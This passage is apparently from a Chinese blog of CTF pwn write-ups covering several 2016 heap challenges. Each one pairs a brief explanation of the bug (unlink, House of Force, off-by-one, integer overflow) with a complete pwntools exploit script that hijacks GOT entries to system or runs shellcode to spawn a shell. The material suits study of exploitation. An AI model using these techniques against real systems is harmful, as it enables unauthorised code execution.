</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;atoi&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;free&#39;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]))</span> <span class=c1># free -&gt; puts</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>atoi</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span><span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>atoi</span><span class=p>,</span><span class=s1>&#39;atoi&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=secretholder_hitcon_2016 class="relative group">secretHolder_hitcon_2016 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#secretholder_hitcon_2016 aria-label=é”šç‚¹>#</a></span></h3><p>ç±»ä¼¼ä¸Šä¸€é¢˜ï¼Œä¸è¿‡ huge å¯ä»¥ä¿®æ”¹å’Œåˆ é™¤äº†ã€‚ç”±äº huge éå¸¸å¤§ï¼Œåˆ†é…æ—¶ä¼šè°ƒç”¨ <code>mmap()</code>ï¼Œä½†æ˜¯å½“é‡Šæ”¾æ‰ huge å†ç”³è¯·æ—¶ï¼Œ<code>mmap_threshold</code> å·²ç»å˜å¾—å’Œ huge ä¸€æ ·å¤§ï¼Œæ­¤æ—¶åˆ†é… huge ä½¿ç”¨çš„æ˜¯ <code>brk()</code>ï¼Œå› æ­¤ huge è¢«åˆ†é…åˆ°äº†å †ä¸Šã€‚</p><p>åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä»¤ small å’Œ huge åœ°å€é‡åˆï¼Œéšååœ¨ä¸‹é¢å«ä¸Š bigã€‚åœ¨ small é‡Œä¼ªé€ å †å—å¹¶é‡Šæ”¾ bigï¼Œè§¦å‘ unlinkï¼Œå‰©ä½™çš„å·¥ä½œå°±å’Œä¸Šä¸€é¢˜ä¸€æ¨¡ä¸€æ ·äº†ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=nb>type</span><span class=p>,</span><span class=n>content</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Renew secret</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Huge secret</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=nb>type</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sa</span><span class=p>(</span><span class=s1>&#39;: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=nb>type</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Renew secret</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Huge secret</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=nb>type</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=nb>type</span><span class=p>,</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Renew secret</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Huge secret&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=nb>type</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sa</span><span class=p>(</span><span class=s1>&#39;: </span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=c1># mmap threshold +++</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span> <span class=c1># brk()</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># small &lt;-&gt; huge</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>small</span> <span class=o>=</span> <span class=mh>0x6020b0</span>
</span></span><span class=line><span class=cl><span class=n>fd</span> <span class=o>=</span> <span class=n>small</span><span class=o>-</span><span class=mh>0x18</span>
</span></span><span class=line><span class=cl><span class=n>bk</span> <span class=o>=</span> <span class=n>small</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>,</span><span class=n>fd</span><span class=p>,</span><span class=n>bk</span><span class=p>,</span><span class=mh>0x20</span><span class=p>,</span><span class=mh>0x90</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x21</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ?,big,huge,small,big_flag,huge_flag,small_flag</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;atoi&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;free&#39;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]))</span> <span class=c1># free -&gt; puts</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>atoi</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span><span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>atoi</span><span class=p>,</span><span class=s1>&#39;atoi&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=bcloud_bctf_2016 class="relative group">bcloud_bctf_2016 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#bcloud_bctf_2016 aria-label=é”šç‚¹>#</a></span></h3><p>åœ¨è¯»å…¥åå­—å’Œè¯»å…¥ Org ä»¥åŠ Host æ—¶ï¼Œå‡å­˜åœ¨åŒæ ·çš„ <code>strcpy</code> æ¼æ´ï¼Œå‰è€…å¯¼è‡´æ³„éœ²å †åœ°å€ï¼Œè€Œåè€…å…è®¸æˆ‘ä»¬ off-by-one ä¿®æ”¹ top chunk çš„å¤§å°ï¼Œä»è€Œå®ç° House of Forceã€‚é€šè¿‡ gdb è°ƒè¯•å¾—åˆ° <code>top_chunk = heap + 0xd0</code>ï¼Œé‚£ä¹ˆæ„é€ çš„ <code>evil_size</code> å°±æ˜¯æˆ‘ä»¬æƒ³åˆ†é…åˆ°çš„ <code>note_len</code> æ•°ç»„åœ°å€å‡å» header çš„ 0x8ï¼Œå‡å» <code>old_top_chunk</code> åœ°å€ï¼Œå†å‡å» 12ï¼Œè¿™æ˜¯å› ä¸ºå·²ç»åˆ†é…äº†ä¸‰ä¸ªå †å—ï¼Œåœ¨ç¨‹åºä¸­æ¯ä¸ªå †å—é¢å¤–åˆ†é…äº† 4Bã€‚æœ€åä» <code>note_len</code> è¦†ç›–åˆ° <code>note</code> æ•°ç»„ï¼ŒåŠ«æŒ <code>free</code> åˆ° <code>printf</code> æ³„éœ² libcï¼Œå†åŠ«æŒ <code>atoi</code> åˆ° <code>system</code>ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=nb>len</span><span class=p>,</span><span class=n>content</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sa</span><span class=p>(</span><span class=s1>&#39;:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>index</span><span class=p>,</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;name:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x40</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x40</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap</span> <span class=o>=</span> <span class=n>uu32</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;heap&#39;</span><span class=p>,</span><span class=n>heap</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;Org:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x40</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Host:</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>p32</span><span class=p>(</span><span class=mh>0xffffffff</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>note_len</span> <span class=o>=</span> <span class=mh>0x804b0a0</span>
</span></span><span class=line><span class=cl><span class=n>note</span> <span class=o>=</span> <span class=mh>0x804b120</span>
</span></span><span class=line><span class=cl><span class=n>top_chunk</span> <span class=o>=</span> <span class=n>heap</span> <span class=o>+</span> <span class=mh>0xd0</span>
</span></span><span class=line><span class=cl><span class=n>evil_size</span> <span class=o>=</span> <span class=n>note_len</span><span class=o>-</span><span class=mh>0x8</span><span class=o>-</span><span class=n>top_chunk</span><span class=o>-</span><span class=mh>0xc</span> <span class=c1># gdb</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>evil_size</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>((</span><span class=n>note</span><span class=o>-</span><span class=n>note_len</span><span class=p>)</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;atoi&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;free&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;atoi&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>),</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>p32</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;printf&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=c1># printf(atoi.got)</span>
</span></span><span class=line><span class=cl><span class=n>atoi</span> <span class=o>=</span> <span class=n>uu32</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>4</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span><span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>atoi</span><span class=p>,</span><span class=s1>&#39;atoi&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span><span class=n>p32</span><span class=p>(</span><span class=n>system</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=lctf2016_pwn200 class="relative group">lctf2016_pwn200 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#lctf2016_pwn200 aria-label=é”šç‚¹>#</a></span></h3><p>é¦–å…ˆä¸éš¾å‘ç°è¯»å…¥ <code>name</code> æ—¶å­˜åœ¨ off-by-oneï¼Œå¯ä»¥å€Ÿæ­¤æ³„éœ²æ ˆåœ°å€ã€‚ä¸ºäº†åé¢ ret2shellcodeï¼Œæˆ‘ä»¬å¯ä»¥å…ˆåœ¨ <code>name</code> é‡Œé¡ºä¾¿å†™å¥½ shellcodeï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>sh</span><span class=p>())</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>48</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;u?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rbp</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;, w&#39;</span><span class=p>,</span><span class=kc>True</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;rbp&#39;</span><span class=p>,</span><span class=n>rbp</span><span class=p>)</span>
</span></span></code></pre></div><p>è€Œè¯»å…¥ <code>money</code> æ—¶ï¼Œæ°å¥½å¯ä»¥è¦†ç›–åˆ°å †æŒ‡é’ˆ <code>dest</code>ã€‚é‚£ä¹ˆå¯ä»¥è¦†ç›– <code>dest</code> ä¸ºæˆ‘ä»¬ä¼ªé€ çš„ chunkï¼ŒåŒæ—¶å‡†å¤‡å¥½ <code>id</code>ï¼ˆåªéœ€è¦å¤§äº 0x10 å°äº 0x21000 å³å¯ï¼‰ä½œä¸º <code>nextsize</code>ï¼Œè¿™æ ·å°±å¯ä»¥å…ˆé‡Šæ”¾å†ç”³è¯·è¿™ä¸ª fake chunkï¼Œå°±å¯ä»¥æ§åˆ¶ rip äº†ï¼Œæœ€åè¦†ç›– rip ä¸º shellcode åœ°å€ã€‚</p><p>é€šè¿‡ gdb è°ƒè¯•ï¼Œå¯ä»¥ç»˜åˆ¶å¤§è‡´çš„æ ˆç»“æ„å›¾ï¼š</p><pre tabindex=0><code> ------------ &lt;- leaked rbp
|            | 0x20
 ------------ &lt;- rbp
| shellcode  | 0x30
 ------------ &lt;- shellcode_addr  --
| 0x20       | id                 |
 ------------                     |
|            |                    |
 ------------                     |
| rip        |                    | 0x40
 ------------                     |
| rbp        |                    |
 ------------                     |
| dest       |                    |
 ------------ &lt;- fake            --
| 0x41       |
 ------------
| prev_size  |
 ------------
| ...        |
</code></pre><p>ç”±æ­¤å¯ä»¥å¾—åˆ°ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=n>rbp</span><span class=o>-</span><span class=mh>0x50</span>
</span></span><span class=line><span class=cl><span class=n>fake</span> <span class=o>=</span> <span class=n>rbp</span><span class=o>-</span><span class=mh>0x90</span>
</span></span></code></pre></div><p>ä»è€Œä¼ªé€ å †å—ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;id ~~?</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=mh>0x20</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;money~</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>flat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x41</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>fake</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;choice :&#39;</span><span class=p>,</span><span class=s1>&#39;2&#39;</span><span class=p>)</span> <span class=c1># free</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;choice :&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span> <span class=c1># malloc</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;long?&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=mh>0x30</span><span class=p>))</span> <span class=c1># + 0x10 = 0x40</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;48&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x18</span><span class=p>,</span><span class=n>sc</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;choice :&#39;</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=zctf2016_note2 class="relative group">zctf2016_note2 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#zctf2016_note2 aria-label=é”šç‚¹>#</a></span></h3><p>æ·»åŠ  note æ—¶ï¼Œå­˜åœ¨æ•´æ•°æº¢å‡ºæ¼æ´ï¼Œå¯¼è‡´æ·»åŠ å¤§å°ä¸º 0 çš„ noteï¼Œå¯ä»¥è¾“å…¥çš„é•¿åº¦ä¸ºæ— ç¬¦å·çš„ <code>-1</code>ï¼Œå¯ä»¥è®¤ä¸ºæ²¡æœ‰é™åˆ¶ï¼Œä½†æ˜¯ <code>malloc</code> ä¾æ—§ä¼šåˆ†é… <code>0x20</code> å­—èŠ‚ã€‚åˆ©ç”¨è¿™ä¸ªå †æº¢å‡ºï¼Œæˆ‘ä»¬å…ˆåˆ†é…ä¸‰ä¸ª chunkï¼š</p><pre tabindex=0><code>| ...               |               |
 -------------------                |
| &#39;a&#39;*8             |               |
 ------------------- &lt;- ptr[2]    chunk2
| size=0x91         |               |
 -------------------                |
| prev_size         |               |
 ------------------- &lt;---------------
|                   |               |
 -------------------                |
| &#39;a&#39;*8             |               |
 ------------------- &lt;- ptr[1]    chunk1
| size=0x20         |               |
 -------------------                |
| prev_size         |               |
 ------------------- &lt;---------------
|                   | 0x18          |
 -------------------                |
| bp_prev_size=0x60 |               |
 -------------------                |
| &#39;a&#39;*0x40          | 0x40          |
 -------------------                |
| fd     | bk       | 0x10          |
 -------------------              chunk0
| fake_size=0x61    |               |
 -------------------                |
| fake_prev_size=0  |               |
 ------------------- &lt;- ptr[0]      |
| size=0x91         |               |
 -------------------                |
| prev_size         |               |
 ------------------- &lt;---------------
</code></pre><p>æˆ‘ä»¬åœ¨ 0x80 çš„ <code>chunk0</code> å†…ä¼ªé€ äº† 0x61 çš„ chunkï¼Œå¹¶é€šè¿‡ <code>bp_prev_size=0x60</code> ç¡®ä¿èƒ½é€šè¿‡æ£€æŸ¥ã€‚éšååˆ†é…å¤§å°ä¸º <code>0</code> çš„ <code>chunk1</code>ï¼ˆå®é™…å¤§å°ä¸º 0x20ï¼‰ï¼Œç”±äºæ•´æ•°æº¢å‡ºè¿™é‡Œå¯ä»¥è¾“å…¥æ— é™é•¿åº¦çš„å†…å®¹ï¼Œæœ€ååˆ†é… 0x80 çš„ <code>chunk2</code> ç”¨æ¥å¼•èµ· <code>unlink</code>ã€‚</p><p>æ¥ä¸‹æ¥é‡Šæ”¾ 1 å†æ‹¿å›æ¥ï¼Œå°±å¯ä»¥æº¢å‡ºåˆ° <code>chunk2</code>ï¼Œä¿®æ”¹å…¶ <code>prev_size</code> å’Œ <code>chunk_size</code>ï¼Œå‰è€…ä¿®æ”¹ä¸º <code>0x20+0x80=0xa0</code>ï¼Œåè€…ç½® <code>PREV_IN_USE</code> ä½ä¸º <code>0</code>ã€‚è¿™æ ·å†é‡Šæ”¾ 2 å°±å¯ä»¥ <code>unlink</code> æ‰æˆ‘ä»¬çš„ fake chunk äº†ã€‚æ­¤æ—¶ <code>ptr</code> æŒ‡å‘ <code>ptr-0x18</code>ï¼Œå¡«å…… 0x18 å­—èŠ‚åå³å¯ä¿®æ”¹ <code>ptr[0]</code>ï¼Œä¹‹åå°±æ˜¯å¸¸è§„ GOT åŠ«æŒäº†ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=nb>len</span><span class=p>,</span><span class=n>content</span><span class=o>=</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;&gt;&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;128)&#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>))</span>
